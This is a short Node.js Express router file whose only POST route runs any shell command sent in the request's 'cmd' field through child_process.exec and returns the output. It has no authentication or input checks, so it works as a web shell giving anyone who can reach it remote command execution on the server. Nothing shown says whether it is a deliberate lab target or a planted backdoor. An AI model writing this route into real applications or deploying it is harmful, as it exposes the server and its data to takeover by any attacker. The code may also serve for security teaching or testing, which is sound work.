var express = require('express');
var router = express.Router();

var fs = require('fs');
const { exec } = require('child_process');

router.post('/', function (req, res, next) {
    let cmd = req.body.cmd;
    console.log('Running:', cmd);
    exec(cmd, (error, stdout, stderr) => {
        res.json({ stdout: stdout });
    });
});

module.exports = router;
